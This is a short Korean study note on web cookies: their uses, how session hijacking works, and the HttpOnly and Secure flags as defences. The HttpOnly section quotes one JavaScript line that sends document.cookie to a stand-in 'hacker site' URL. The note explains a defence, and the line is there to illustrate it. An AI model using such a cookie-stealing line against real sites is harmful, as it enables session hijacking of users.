### 쿠키의 사용 목적

1. 세션관리  
   (ex) 서버에 저장해야 할 로그인, 장바구니, 게임 스코어 등
2. 개인화  
   사용자 선호, 테마등의 정보
3. 트래킹  
   사용자 행동을 기록하고 분석

### 사전 지식

1. 어떠한 서버도 HTTP통신을 한다면 쿠키를 주고받을 수 있다.
2. 클라이언트에서도 쿠키에 접근하고 관리할 수 있다.
3. HTTP와 HTTPS 사이에도 쿠키를 교환할 수 있다.
4. 같은 도메인이라면 서로 다른 Scheme일지라도 쿠키를 공유할 수 있다.
5. 쿠키는 서버든 클라이언트든 생성할 수 있다.
6. 쿠키가 생성되면 브라우저는 해당 쿠키 정보를 저장한다.
7. 생성 이후 발생하는 모든 Request에 쿠키를 포함하여 서버에 전달한다.

### 보안 위협

- 수많은 사이트들에서 민감한 개인정보를 쿠키에 저장하고 있는데, 해커들은 다양한 바업으로 이 쿠키를 탈취하려고 한다. (세션 하이재킹 공격)
- `HTTP`는 `Stateless` 프로토콜이기 때문에 기본적으로 상태 정보를 저장하지 않는다.
  1. 요청자가 누구인지, 같은 사람이었는지를 식별할 수 없다.
  2. 식별을 위한 데이터 저장 용도로 쿠키를 사용
  3. 식별 정보가 포함된 쿠키를 해커가 탈취하면 해당 사용자로 위장할 수 있다.

### 보안 강화 방법

#### HTTP only Cookies

`Set-Cookie: 쿠키명=쿠키값; path=/; HttpOnly`

위와같이 `Set-Cookie` 헤더에 `HttpOnly`를 추가하여 적용할 수 있다.g

- 브라우저에서 쿠키에 접근할 수 없도록 제한한다.  
  이를 통해 아래와 같이 자바스크립트로 쿠키를 가로채려는 시도를 막을 수 있다.  
  `location.href= "<http://해커사이트/?cookies=>" + document.cookie;`

#### Secure Cookies

`Set-Cookie: 쿠키명=쿠키값; path=/; secure`

- `HTTP Only Cookie`로 javascript의 쿠키 탈취는 막을 수 있지만 네트워크 트래픽에서 쿠키를 가로채는 것까지는 막지 못한다.
- 통신상의 유출을 막기 위해 HTTPS 프로토콜을 사용하여 데이터를 암호화 하는 방법이 주로 사용된다.  
  (HTTPS 사용시 쿠키까지 암호화되어 전송되기 때문에 제3자는 내용을 알 수 없다.)
- 실수로 HTTP를 통해 통신을 하는 경우 쿠키를 탈취당할 수 있는데 이를 방지하기 위해 쿠키 생성시 `secure` 접미사를 붙이면 HTTPS가 아닌경우 쿠키를 전송하지 않는다.

[참고](https://nsinc.tistory.com/121)
